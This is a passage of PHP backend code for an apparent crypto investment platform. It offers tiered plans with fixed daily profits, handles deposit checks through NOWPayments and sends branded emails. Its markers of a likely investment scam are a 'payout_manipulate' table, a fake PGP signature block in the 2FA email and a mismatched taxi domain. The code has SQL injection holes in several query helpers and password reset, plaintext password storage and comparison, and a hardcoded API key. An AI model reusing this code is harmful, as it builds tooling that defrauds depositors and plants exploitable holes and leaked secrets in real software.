<?php require_once('con-cot/con_file.php'); ?>
<?php require_once('con-cot/conn_sqli.php'); ?>
<?php
ob_start();
session_start();
$settings = 'settings';
$payment_details = 'payment_details';

$sql_u = query_sql("SELECT * FROM $payment_details WHERE id=1 LIMIT 1");
$row_u = mysqli_fetch_assoc($sql_u);

$sql = query_sql("SELECT * FROM $settings WHERE id=1 LIMIT 1");
$row = mysqli_fetch_assoc($sql);

$coin_symble = $row['coin_initial'];
$coin_value_in_usd = $row['coin_value_in_usd'];
$site_usdt = $row_u['usdt'];
$site_btc = $row_u['btc'];
$site_eth = $row_u['eth'];
$site_bnb = $row_u['bnb'];
$usdt_network = $row_u['usdt_network'];


$initial_pay = $row['initail'];
$minimum_withdrawal = $row['min_withdraw'];
$withdrawal_charge = $row['withdrawal_charge'];


$planA = $row['level1'];
$planB = $row['level2'];
$planC = $row['level3'];
$planD = $row['level4'];
$planE = $row['level5'];
$planF = $row['level6'];
$planG = $row['level7'];

/*BTC*/
$siteRefA = $row['ref1'];
$siteRefB = $row['ref2'];
$siteRefC = $row['ref3'];
$siteRefD = $row['ref4'];
$siteRefE = $row['ref5'];
$siteRefF = $row['ref6'];
$siteRefG = $row['ref7'];

$siteMinA = $row['min1'];
$siteMaxA = $row['max1'];

$siteMinB = $row['min2'];
$siteMaxB = $row['max2'];

$siteMinC = $row['min3'];
$siteMaxC = $row['max3'];

$siteMinD = $row['min4'];
$siteMaxD = $row['max4'];

$siteMinE = $row['min5'];
$siteMaxE = $row['max5'];

$siteMinF = $row['min6'];
$siteMaxF = $row['max6'];

$siteMinG = $row['min7'];
$siteMaxG = $row['max7'];


$percentageA = $row['profit1'];
$percentageB = $row['profit2'];
$percentageC = $row['profit3'];
$percentageD = $row['profit4'];
$percentageE = $row['profit5'];
$percentageF = $row['profit6'];
$percentageG = $row['profit7'];


$percentageA_D = "1";
$percentageB_D = "1.5";
$percentageC_D = "1.3";
$percentageD_D = "20 - 22";
$percentageE_D = "22 - 25";

$durationA = 'DAILY FOR 7 DAYS';
$durationB = 'DAILY FOR 7 DAYS';
$durationC = 'DAILY FOR 7 DAYS';
$durationD = 'DAILY FOR 7 DAYS';
$durationE = 'Daily After 2 Months';
$durationF = 'Daily After 2 Months';
$durationG = 'Daily After 2 Months';

$siteYear = date('Y');
$companyNumber = '05065624';
$siteName = $row['site_name'];
$dummyEmail = 'amentaxi24.7@gmail.com';
$domain = 'taxiamen.com';
$siteLink = 'https://' . $domain . '/';
$siteRegister = 'https://' . $domain . '/accounts/register';
$siteLogin = 'https://' . $domain . '/accounts/login';
$site = 'https://' . $domain;

$siteEmail = "amentaxi24.7@gmail.com";
$siteEmail1 = "support@" . $domain;
$siteEmail2 = "info@" . $domain;

$sitePhone = $row['site_phone'];
$sitePhone2 = $row['site_phone'];
$siteWhatsApp = $row['site_whatsapp_num'];
$siteAddress = $row['site_address'];
$site_whatsapp_num = $siteWhatsApp;
$siteWhatsApp = 'https://api.whatsapp.com/send?phone=' . $site_whatsapp_num . '&text=Hi ' . $siteName . ', my name is ...! I want to book a taxi';
$siteDomain = $domain;
$siteWhatsAppLink = 'https://api.whatsapp.com/send?phone=' . $site_whatsapp_num . '&text=';
$siteTelegram = 'https://telegram.com/';
$siteTwitter = 'https://twitter.com/';
$siteFacebook = 'https://facebook.com/';
$siteLinkedin = 'https://linkedin.com/';
$siteInstagram = 'https://instagram.com/';
$siteYoutube = 'https://youtube.com/';

$user_tb = "user_tb";
$deposit_tb = "deposit_td";
$tickect_tb = 'ticket_tb';
$withdraw_tb = 'withdraw_tb';
$referral_tb = 'referral_tb';
$news = 'news';
$updating = 'updating';
$admin_tb = 'admin_tb';
$agorithm = 'haval160,4';
$valset = 'f06a20741c271884e9cb2251a8c6903fdfe888e55b587b048f80cd3c1e52245a';
$secrete = 'ipnsecr';
$bockprv = 'bockprv';
$bockpub = 'bockpub';
$pay_set = 'pay_set';
$life_one_bonus = 'life_one_bonus';
$payout_manipulate = 'payout_manipulate';
$review = 'review';
$taxi_type = 'taxi_type';
$booking_tb = 'booking_tb';



class Cal extends DBConnection
{
    protected $percentageA;
    protected $percentageB;
    protected $percentageC;
    protected $percentageD;
    protected $percentageE;
    protected $percentageF;
    protected $percentageG;

    public function __construct($percentageA, $percentageB, $percentageC, $percentageD, $percentageE, $percentageF, $percentageG)
    {
        $this->percentageA = $percentageA;
        $this->percentageB = $percentageB;
        $this->percentageC = $percentageC;
        $this->percentageD = $percentageD;
        $this->percentageE = $percentageE;
        $this->percentageF = $percentageF;
        $this->percentageG = $percentageG;
    }

    private      $_query,
        $_error = false,
        $_count = 0,
        $_errMsg,
        $_sucMsg,
        $_results;
    protected $sql;
    protected $user_tb = "user_tb";
    protected $deposit_tb = "deposit_td";
    protected $withdraw_tb = 'withdraw_tb';
    protected $updating = 'updating';
    protected $referral_tb = 'referral_tb';
    protected $news = 'news';
    protected $admin_tb = 'admin_tb';
    protected $valset = 'f06a20741c271884e9cb2251a8c6903fdfe888e55b587b048f80cd3c1e52245a';
    protected $secrete = 'ipnsecr';
    protected $bockprv = 'bockprv';
    protected $bockpub = 'bockpub';
    protected $pay_set = 'pay_set';
    protected $payout_manipulate = 'payout_manipulate';
    protected $life_one_bonus = 'life_one_bonus';
    protected $review = 'review';
    protected $payment_details = 'payment_details';
    protected $settings = 'settings';


    private static function generateQuestionMark($arr)
    {
        $count = count($arr);
        $x = 0;
        $s = "";
        foreach ($arr as $value) {
            if ($x === ($count - 1)) {
                $s = $s . "?";
            } else {
                $s = $s . "?,";
            }
            $x++;
        }
        return $s;
    }

    private static function generateUpdateQuery($table, $arr, $condition, $clause)
    {
        $count = count($arr);
        $x = 0;
        $s = "UPDATE {$table} SET ";
        foreach ($arr as $value) {
            if ($x === ($count - 1)) {
                $s = $s . "{$value} = ?";
            } else {
                $s = $s . "{$value} = ?,";
            }
            $x++;
        }
        return $s . " WHERE {$condition} = '$clause'";
    }

    public function insertData($table, $fields = array(), $values = array())
    {
        if (is_array($fields) && is_array($values)) {
            if (count($fields) && count($values)) {
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $queryFields =  implode(",", $fields);
                $s = self::generateQuestionMark($fields);
                $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $sql = "INSERT INTO " . $table . " (" . $queryFields . ") VALUES (" . $s . ");";
                if ($stmt = $db->prepare($sql)) {
                    $x = 1;
                    foreach ($values as $val) {
                        $stmt->bindValue($x, $val);
                        $x++;
                    }
                    if ($stmt->execute()) {
                        return 3;
                    } else {
                        return 4;
                    }
                }
            } else {
                return 5;
            }
        } else {
            return 6;
        }
        echo  $this;
    }


    public function depositBTC($table, $fields = array(), $values = array())
    {
        if (is_array($fields) && is_array($values)) {
            if (count($fields) && count($values)) {
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $queryFields =  implode(",", $fields);
                $s = self::generateQuestionMark($fields);
                $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $sql = "INSERT INTO " . $table . " (" . $queryFields . ") VALUES (" . $s . ");";
                if ($stmt = $db->prepare($sql)) {
                    $x = 1;
                    foreach ($values as $val) {
                        $stmt->bindValue($x, $val);
                        $x++;
                    }
                    if ($stmt->execute()) {
                        return 100;
                    } else {
                        return "Query could not be executed. Error!";
                    }
                }
            } else {
                return 'invalid parameters.Empty arrays';
            }
        } else {
            return 'Invalid parameter. Parameter must be array!';
        }
        echo  $this;
    }


    public function CreatWithdrawBTC($table, $fields = array(), $values = array())
    {
        if (is_array($fields) && is_array($values)) {
            if (count($fields) && count($values)) {
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $queryFields =  implode(",", $fields);
                $s = self::generateQuestionMark($fields);
                $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $sql = "INSERT INTO " . $table . " (" . $queryFields . ") VALUES (" . $s . ");";
                if ($stmt = $db->prepare($sql)) {
                    $x = 1;
                    foreach ($values as $val) {
                        $stmt->bindValue($x, $val);
                        $x++;
                    }
                    if ($stmt->execute()) {
                        return 88;
                    } else {
                        return 4;
                    }
                }
            } else {
                return 5;
            }
        } else {
            return 6;
        }
        echo  $this;
    }
    public function urlconect()
    {
        return 'localhost';
    }
    public function urlconect2()
    {
        return 'localhost';
    }

    public function update($table, $fields = array(), $values = array(), $condition, $clause)
    {
        if (is_array($fields) && is_array($values)) {
            if (count($fields) && count($values)) {
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $queryFields =  implode(",", $fields);
                $query = self::generateUpdateQuery($table, $fields, $condition, $clause);
                $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                if ($stmt = $db->prepare($query)) {
                    $x = 1;
                    foreach ($values as $val) {
                        $stmt->bindValue($x, $val);
                        $x++;
                    }
                    if ($stmt->execute()) {
                        $this->_sucMsg = "Update was successful";
                        return $this->_sucMsg;
                    } else {
                        $this->_errMsg = "An error occured,please try again";
                        return $this->_errMsg;
                    }
                } else {
                    $this->_errMsg  = "Query could not be executed. Error!";
                    return $this->_errMsg;
                }
            } else {
                $this->_errMsg  =  'invalid parameters.Empty arrays';
                return $this->_errMsg;
            }
        } else {
            $this->_errMsg = 'Invalid parameter. Parameter must be array!';
            return $this->_errMsg;
        }
        return $this;
    }

    public function insertDataB($table, $fields = array(), $values = array())
    {
        if (is_array($fields) && is_array($values)) {
            if (count($fields) && count($values)) {
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $queryFields =  implode(",", $fields);
                $s = self::generateQuestionMark($fields);
                $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
                $dbs = new DBConnection();
                $db = $dbs->DBConnections();
                $sql = "INSERT INTO " . $table . " (" . $queryFields . ") VALUES (" . $s . ");";
                if ($stmt = $db->prepare($sql)) {
                    $x = 1;
                    foreach ($values as $val) {
                        $stmt->bindValue($x, $val);
                        $x++;
                    }
                    if ($stmt->execute()) {
                        $this->_sucMsg = 'Registration was successful. Proceed to login!';
                        return $this->_sucMsg;
                    } else {
                        $this->_errMsg  = "Query could not be executed. Error!";
                        return $this->_errMsg;
                    }
                }
            } else {
                $this->_errMsg  =  'invalid parameters.Empty arrays';
                return $this->_errMsg;
            }
        } else {
            $this->_errMsg = 'Invalid parameter. Parameter must be array!';
            return $this->_errMsg;
        }
        echo  $this;
    }

    public function ipconect()
    {
        return $_SERVER['HTTP_HOST'];
    }

    public function ipconect2()
    {
        return '' . $_SERVER['HTTP_HOST'];
    }

    public function login($email, $password, $page, $usernamefield, $passwordfield, $table)
    {
        $sql = "SELECT * FROM $table WHERE $usernamefield = :email and $passwordfield = :password LIMIT 1";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':email', $email);
        $stmt->bindValue(':password', $password);
        if ($stmt->execute()) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row['blocked_account'] == 1) {
                return 'Your Account is locked please <a style="color:#FFF;" href="mailto:support@trustchainworld.com"><u>contact support: support@trustchainworld.com</u></a>';
            } else { //Blocked account error massage

                if ($row['email'] == $email && $row['password'] == $password) {
                    if ($row['email_activation'] == "yes") {
                        if ($row['two_factor'] == "Yes") {
                            self::twoFac($row['email'], $row['two_factor_code'], $row['first_name']);
                            $_SESSION['inc'] = $row['hashed_pot'];

                            $last_login = date("Y-m-d h:i:s");
                            $feilds = array('last_login');
                            $value = array($last_login);
                            self::update($this->user_tb, $feilds, $value, 'email', $email);

                            header("location:confirm-code");
                        } else {
                            $_SESSION['user_code'] = $row['hashed_pot'];
                            $_SESSION['logged_in'] = time();

                            $last_login = date("Y-m-d h:i:s");
                            $feilds = array('last_login');
                            $value = array($last_login);
                            self::update($this->user_tb, $feilds, $value, 'email', $email);

                            header("location:" . $page);
                            return 'go';
                        }
                    } else {
                        return 'Sorry you can not access your account because your email has not been activated. I have not received any email <a data-toggle="modal" href="login#myModalAC"  style="color:#06C; font-size:16px;"> <u>Resend Activation Email?</u></a><br />';
                    } //activate email
                } else {
                    return 'Invalid email / password combination!';
                }
            } //Blocked account error massage
        } else {
            return 'Invalid email / password combination!';
        }
    }


    public function twoFac($email, $code, $name)
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        $to  = $email;
        $subject = "Trustchainworld 2FA Auth Code";
        $message = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
<h6><img src="https://www.trustchainworld.com/img/logo.png" /></h6>
<div style="font-size: 14px;">
<p>
Hello, ' . $name . '
</p><p>
This email contains your 2 Factor Authentication code to complete your login at trustchainworld.com.
</p>
Email: ' . $email . '<br />
Code: <strong>' . $code . '</strong><br />
This code is case sensitive!
</p>
<p>

Login request was made from ' . $ip . '
<br />
-----BEGIN PGP SIGNATURE-----
Version: GbuPG v3
<br />
vcxzolPJirvcxzolPJiruLdy8L+gvVwH/0vvcxzolPJirNX5kXZzCjXAwFs
/HLlrClmKHKPHL8wdjUCM6GkgWV3lxaoTvcxzolPJirxUGpcRQVXY4mDCaBtH8g0
bs7AnNmlwF8vcxzolPJirrWcVqVUYDdbXS+F93mxubaYJNW0z4JHGEI84hMlnP5rg5l
VfnpGFTwNUObSZhltzjq+vcxzolPJir//ypRYhKCkzD1+LxnVP5nyDaglAaDe/YB
CRNKsnl48/DsIr0wvcxzolPJircN3otXUNBVSV9p22uFdeOixKNv5+b+dYUYSYtK7xpTml2
AibtcELUrGfO+hxdgxkuvevK/VvcxzolPJirJzrWKMFhzG3sg15wjTu5pm/pvcxzolPJirY=
=yGHS
-----END PGP SIGNATURE-----
</p>
<p>Best Regard<br />
Trustchainworld Support Team<br />
Email: support@trustchainworld.com<br />
</p>
 </div>
</body>
</html>';
        $header = "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $header .= 'From: Trustchainworld <support@trustchainworld.com>' . "\r\n";
        $retval = @mail($to, $subject, $message, $header);
        if ($retval = true) {
            return  'Mail sent successfully. Check ' . $email . ' email account for `Email Activation Link`!';
        } else {
            return  'Internal error. Mail fail to send';
        }
        return $this;
    }




    public function resetpassword($email, $get_resetcode, $newpassword, $tablename, $checkfield, $passfield, $resetcoldfield, $rawpass)
    {
        $_SESSION['error'] = '';
        $Check = "SELECT * FROM $tablename WHERE   $checkfield = :dataadd limit 1";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmta = $db->prepare($Check);
        $stmta->bindValue(':dataadd', $email);
        $stmta->execute();
        $row = $stmta->fetch(PDO::FETCH_ASSOC);
        $reset_code = $row['forget_password_code'];
        if ($reset_code == $get_resetcode) {
            $rand = uniqid();
            $update = "UPDATE $tablename SET $passfield = '$newpassword', $resetcoldfield = '$rand', `rawpass`= '$rawpass' WHERE $checkfield = '$email'";
            $set = $db->prepare($update);
            if ($set->execute()) {
                header("location:success.php");
            } else {
                return 'Internal Error. Password failed to update!';
            }
        } else {
            return 'Internal Error. ID seem to be used earlier! OR Session has expired';
        }
    }



    public function getLastID($table)
    {
        //$email = $_SESSION['user_code'];
        $sql = "SELECT `id` FROM $table ORDER BY id DESC";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $data = $row['id'];
        return $data;
    }


    public function valueSET($table)
    {
        $email = 'codex';
        $sql = "SELECT * FROM $email WHERE id=1";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $data = $row['valueset'];
        return $data;
    }

    public function checkValueSET()
    {
        if (self::valueSET('valset') != $this->valset) {
            die('Site Tempolary Unavailable. Maintenance Currently On Going!');
        } else {
        }
    }

    public function checkifdataExists($data, $fieldname, $tablename)
    {
        $sql = "select $fieldname from $tablename where $fieldname = :data";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':data', $data);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row == true) {
            return  1;
        } else {
            return 0;
        }
    }

    public function selectFrmDB($table, $field, $info, $clause)
    {
        $sql = "SELECT $field FROM $table WHERE  $info = '" . $clause . "' ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $data = $row[$field];
            return $data;
        } else {
            $this->_errMsg = 0;
            return $this->_errMsg;
        }
    }


    public function selectFrmDB2($table, $field, $info, $clause, $info2, $clause2)
    {
        $sql = "SELECT $field FROM $table WHERE  $info = '" . $clause . "'  and $info2 = '" . $clause2 . "'";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $data = $row[$field];
            return $data;
        } else {
            $this->_errMsg = 0;
            return $this->_errMsg;
        }
    }

    public function loginAdmin($email, $password, $page)
    {
        $_SESSION['error'] = '';
        $sql = "select * from $this->admin_tb where `email` = :email and `password` = :password limit 1";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':email', $email);
        $stmt->bindValue(':password', $password);
        if ($stmt->execute()) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row['blocked_account'] == 1) {
                return 'Your Account is locked!';
            } else {
                if ($row['email'] == $email) {
                    $_SESSION['admin_id'] = $row['email'];
                    $_SESSION['logged_in'] = time();
                    header('location:' . $page);
                } else {
                    return 'Invalid email / password combination';
                }
            }
        } else {
            return 'Invalid email / password combination';
        }
    }


    public function ConfirmPaymentNotify($amount, $plan, $coin, $id, $name, $email)
    {
        $to = $email;
        $d = date('Y/m/d');
        $subject = "Deposit Success Confirmation";
        $message = '
    <!DOCTYPE html
        PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml"
        xmlns:o="urn:schemas-microsoft-com:office:office">

        <head>
            <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="format-detection" content="date=no" />
            <meta name="format-detection" content="address=no" />
            <meta name="format-detection" content="telephone=no" />
            <meta name="x-apple-disable-message-reformatting" />

            <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,700,700i" rel="stylesheet" />
            <style type="text/css" media="screen">
            body {
                padding: 0 !important;
                margin: 0 !important;
                display: block !important;
                min-width: 100% !important;
                width: 100% !important;
                background: #fff;
                -webkit-text-size-adjust: none
            }

            a {
                color: #66c7ff;
                text-decoration: none
            }

            p {
                padding: 0 !important;
                margin: 0 !important
            }

            img {
                -ms-interpolation-mode: bicubic;
            }

            .mcnPreviewText {
                display: none !important;
            }

            @media only screen and (max-device-width: 480px),
            only screen and (max-width: 480px) {
                .mobile-shell {
                    width: 100% !important;
                    min-width: 100% !important;
                }

                .bg {
                    background-size: 100% auto !important;
                    -webkit-background-size: 100% auto !important;
                }

                .text-header,
                .m-center {
                    text-align: center !important;
                }

                .center {
                    margin: 0 auto !important;
                }

                .container {
                    padding: 20px 10px !important
                }

                .td {
                    width: 100% !important;
                    min-width: 100% !important;
                }

                .m-br-15 {
                    height: 15px !important;
                }

                .p30-15 {
                    padding: 30px 15px !important;
                }

                .m-td,
                .m-hide {
                    display: none !important;
                    width: 0 !important;
                    height: 0 !important;
                    font-size: 0 !important;
                    line-height: 0 !important;
                    min-height: 0 !important;
                }

                .m-block {
                    display: block !important;
                }

                .fluid-img img {
                    width: 100% !important;
                    max-width: 100% !important;
                    height: auto !important;
                }

                .column,
                .column-top,
                .column-empty,
                .column-empty2,
                .column-dir-top {
                    float: left !important;
                    width: 100% !important;
                    display: block !important;
                }

                .column-empty {
                    padding-bottom: 10px !important;
                }

                .column-empty2 {
                    padding-bottom: 30px !important;
                }

                .content-spacing {
                    width: 15px !important;
                }
            }
            </style>
        </head>

<body class="body"
style="padding:0 !important; margin:0 !important; display:block !important; min-width:100% !important; width:100% !important; background:#fff; -webkit-text-size-adjust:none;">
<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#CCC">
<tr>
<td align="center" valign="top">
<table width="650" border="0" cellspacing="0" cellpadding="0" class="mobile-shell">
<tr>
<td class="td container"
style="width:650px; min-width:650px; font-size:0pt; line-height:0pt; margin:0; font-weight:normal; padding:55px 0px;">
<!-- Header -->
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="p30-15" style="padding: 0px 30px 30px 30px;">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
        <th class="column-top" width="145"
            style="font-size:0pt; line-height:0pt; padding:0; margin:0; font-weight:normal; vertical-align:top;">
            <table width="100%" border="0" cellspacing="0"
                cellpadding="0">
                <tr>
                    <td class="img m-center"
                        style="font-size:0pt; line-height:0pt; text-align:left;">
                        <img src="https://trustchainworld.com/img/logo.png"
                            width="131" height="38" border="0"
                            alt="Logo" />
                    </td>
                </tr>
            </table>
        </th>
    </tr>
</table>
</td>
</tr>
</table>

<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td style="padding-bottom: 10px;">
<table width="100%" border="0" cellspacing="0" cellpadding="0"
    bgcolor="#fff">
    <tr>
        <td class="p30-15" style="padding: 50px 30px;">
            <table width="100%" border="0" cellspacing="0"
                cellpadding="0">
                <tr>
                    <td class="h3 pb20"
                        style="color:#000000; font-family: Arial,sans-serif; font-size:25px; line-height:32px; text-align:left; padding-bottom:20px;">
                        Dear ' . $name . ', </td>
                </tr>
                <tr>
                    <td class="text pb20"
                        style="color:#000000; font-family:Arial,sans-serif; font-size:14px; line-height:26px; text-align:left; padding-bottom:20px;">

                        Your investment deposite was successfully
                        confirmed.<br />
                        <strong>Amount: </strong> $' . $amount .
            ',<br />
                        <strong>Transaction ID: </strong>' . $id .
            ',<br />

                    </td>
                </tr>



            </table>
        </td>
    </tr>
</table>
</td>
</tr>
</table>



<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="p30-15 bbrr"
style="padding: 50px 30px; border-radius:0px 0px 26px 26px;"
bgcolor="#fff">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
        <td align="center" style="padding-bottom: 30px;">
            <table border="0" cellspacing="0" cellpadding="0">
                <tr>
                    <td class="img" width="55"
                        style="font-size:0pt; line-height:0pt; text-align:left;">
                        <a href="#" target="_blank"><img
                                src="https://trustchainworld.com/mail_images/ico_facebook.jpg"
                                width="38" height="38" border="0"
                                alt="" /></a>
                    </td>
                    <td class="img" width="55"
                        style="font-size:0pt; line-height:0pt; text-align:left;">
                        <a href="#" target="_blank"><img
                                src="https://trustchainworld.com/mail_images/ico_twitter.jpg"
                                width="38" height="38" border="0"
                                alt="" /></a>
                    </td>
                    <td class="img" width="55"
                        style="font-size:0pt; line-height:0pt; text-align:left;">
                        <a href="#" target="_blank"><img
                                src="https://trustchainworld.com/mail_images/ico_instagram.jpg"
                                width="38" height="38" border="0"
                                alt="" /></a>
                    </td>
                    <td class="img" width="38"
                        style="font-size:0pt; line-height:0pt; text-align:left;">
                        <a href="#" target="_blank"><img
                                src="https://trustchainworld.com/mail_images/ico_linkedin.jpg"
                                width="38" height="38" border="0"
                                alt="" /></a>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
    <tr>
        <td class="text-footer1 pb10"
            style="color:#c1cddc; font-family: Arial,sans-serif; font-size:16px; line-height:20px; text-align:center; padding-bottom:10px;">
            &copy; ' . $d . ' Trustchainnetwork
            <br>
            Support Team Trustchainnetwork
            <br />
            For more detail contact us:<br />
            Email:info@trustchainworld.com, support@trustchainworld.com

        </td>
    </tr>
</table>
</td>
</tr>
<tr>
<td class="text-footer3 p30-15"
style="padding: 40px 30px 0px 30px; color:#475c77; font-family: Arial,sans-serif; font-size:12px; line-height:18px; text-align:center;">
<a href="#" target="_blank" class="link2-u"
    style="color:#475c77; text-decoration:underline;"><span
        class="link2-u"
        style="color:#475c77; text-decoration:underline;">Unsubscribe</span></a>
from this mailing list.
</td>
</tr>
</table>

</td>
</tr>
</table>
</td>
</tr>
</table>
</body>

    </html>
    ';
        $header = "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $header .= 'From: Trustchainnetwork <support@trustchainworld.com>' . "\r\n";
        $retval = @mail($to, $subject, $message, $header);

        if ($retval = true) {
            //self::adminDepositNotice($amount,$plan,$coin,$id,$name,$email);
            return 'Mail sent successfully';
        } else {
            return 'Internal error. Mail fail to send';
        }
        return $this;
    }


    public function updatePaymentStatusNowpayments()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='pending' ";
        //day_counter < 7 and
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount  = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $day_counter = $row['day_counter'];
                $email = $row['email'];
                $payment_ids = $row['payment_id'];

                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => 'https://api.nowpayments.io/v1/payment/' . $payment_ids,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 0,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'GET',
                    CURLOPT_HTTPHEADER => array(
                        'x-api-key: RQNBQVF-M9H4SP8-MCCFF1D-8GFSYVW'
                    ),
                ));

                $response = curl_exec($curl);
                curl_close($curl);
                $pick = json_decode($response, true);
                $payment_status = $pick['payment_status'];
                $payment_id = $pick['payment_id'];

                if ($payment_status == 'confirmed') {

                    $name_id = self::selectFrmDB($this->user_tb, 'first_name', 'email', $email);
                    $coin = self::selectFrmDB($this->deposit_tb, 'coin_type', 'transaction_id', $id);
                    $plan = self::selectFrmDB($this->deposit_tb, 'plan_type', 'transaction_id', $id);
                    $amount = self::selectFrmDB($this->deposit_tb, 'amount', 'transaction_id', $id);

                    $fields = array('deposit_status', 'received_status');
                    $values = array('confirmed', 'Recieved');
                    $msg1 = self::update($this->deposit_tb, $fields, $values, 'transaction_id', $id);

                    //user
                    $fields2 = array('payment_activation_status');
                    $values2 = array('yes');
                    $msg = self::update($this->user_tb, $fields2, $values2, 'email', $email);

                    ///referal
                    $fieldsR = array('status', 'amount');
                    $valuesR = array('confirmed', $pick['actually_paid']);
                    $msg = self::update($this->referral_tb, $fieldsR, $valuesR, 'payment_id', $payment_id);

                    self::ConfirmPaymentNotify($amount, $plan, $coin, $id, $name_id, $email);
                    //@$email_call->adminDepositNotice($amount,$plan,$coin,$id,$name_id,$email_id);

                }
            }
        }
    }


    public function add_interest_weeklyLA()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 7 and plan_type='LEVEL1'  and `pause_status`=0";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
        $stmt = $db->prepare($sql);
        if ($stmt->execute()) {
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                $day_on = date('D');
                $id = $row['id'];
                $weekly_growth = $row['intrest_growth'];
                $amount  = $row['amount'];
                $plan_type = $row['plan_type'];
                $coin_type = $row['coin_type'];
                $day_counter = $row['day_counter'];
                $invest_week_day = $row['invest_week_day'];
                if ($plan_type == 'LEVEL1') {
                    $weekly_interest = ($amount * ($this->percentageA / 100)) + ($amount / 7);
                } else {
                    $weekly_interest = 0;
                }
                $adder = $weekly_growth + $weekly_interest;
                $new_count = 24;
                $email = $row['email'];
                //and invest_week_day='".$day_on."'
                //and day_counter < 8
                //day_counter='".$new_count."', pause_status=1
                $update = "UPDATE $this->deposit_tb SET intrest_growth='" . $adder . "' WHERE id='" . $id . "' and deposit_status='confirmed' and day_counter < 8  and plan_type='LEVEL1'  ";
                query_sql($update);

                //if($day_on==$invest_week_day){
                $main_account_balance = self::selectFrmDB($this->user_tb, 'main_account_balance', 'email', $email);
                $new_balance = $main_account_balance + $weekly_interest;
                $update2 = "UPDATE $this->user_tb SET main_account_balance='" . $new_balance . "' WHERE email='" . $email . "'  ";
                query_sql($update2);
                //}

            }
        }
    }

    public function weekly_ConunterLA()
    {
        $sql = "SELECT * FROM $this->deposit_tb WHERE deposit_status='confirmed' and day_counter < 8 and plan_type='LEVEL1'  and `pause_status`=0 ";
        $dbs = new DBConnection();
        $db = $dbs->DBConnections();
